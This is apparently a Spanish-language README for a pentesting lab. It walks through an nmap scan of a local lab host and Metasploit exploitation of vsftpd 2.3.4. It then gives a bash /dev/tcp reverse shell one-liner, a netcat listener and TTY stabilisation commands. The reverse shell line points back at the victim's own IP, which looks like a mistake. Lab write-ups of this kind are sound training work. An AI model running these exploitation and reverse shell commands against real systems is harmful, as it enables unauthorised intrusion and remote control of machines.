# 🛠️ Laboratorio de Pentesting

Este repositorio documenta el uso de herramientas esenciales para realizar un análisis de seguridad, desde el escaneo de puertos hasta la explotación y persistencia en la máquina víctima.

---

## ⚙️ Herramientas utilizadas

- 🔍 [Nmap](https://nmap.org/)
- 💣 [Metasploit Framework](https://www.metasploit.com/)
- 📡 [Netcat](https://nmap.org/ncat/)

---

## 🚀 Despliegue de la máquina

Asegúrate de que la máquina víctima esté encendida y accesible en la red local.

---

## 🔎 Escaneo de Puertos con Nmap

Ejecutamos el siguiente comando para escanear todos los puertos y recopilar información de servicios:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN escaneo.txt
```

### 📌 Parámetros explicados:
nmap: Herramienta de escaneo de red.

-p-: Escanea todos los puertos (1–65535).

-sS: Escaneo SYN (sigiloso).

-sC: Scripts predeterminados.

-sV: Detección de versiones de servicios.

--min-rate 5000: Velocidad mínima de envío (paquetes/seg).

-n: Sin resolución DNS.

-Pn: No hace ping previo (asume host activo).

-vvv: Modo verbose (salida detallada).

-oN escaneo.txt: Guarda salida en archivo de texto plano.

---

## 💥 Explotación con Metasploit
Abrimos la consola de Metasploit:
``` bash
msfconsole
```

Buscamos el exploit para el servicio FTP detectado:
``` bash
search vsftpd 2.3.4
```

Seleccionamos el exploit:
``` bash
use 0
```

Mostramos las opciones disponibles:
``` bash
show options
```

Configuramos la IP de la víctima:
``` bash
set RHOST 172.17.0.2
```

Ejecutamos el exploit:
``` bash
run
```

---

## 🪝 Persistencia con Reverse Shell
Generamos una reverse shell en revshsells.com y la ejecutamos:
``` bash
bash -c "sh -i >& /dev/tcp/172.17.0.2/443 0>&1"
```

Mientras tanto, en la máquina atacante, escuchamos con Netcat:
``` bash
nc -nlvp 443
```

⚠️ Al inicio, comandos como Ctrl + L no funcionan y Ctrl + C puede cerrar la sesión.


### 🛠️ Para estabilizar la shell:
``` bash
script /dev/null -c bash
# Luego presiona Ctrl + Z y ejecuta lo siguiente:
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```

Después de esto, podrás usar combinaciones como Ctrl + C sin perder la conexión.

---

## 📁 Resultados
- 📝 Escaneo: escaneo.txt
- 🧪 Explotación: acceso con Metasploit
- 🔄 Shell persistente y funcional

---

## 👤 Autor
- Jorge Garrido
- Pentester y Hacker Ético
- 📍 Madrid, España
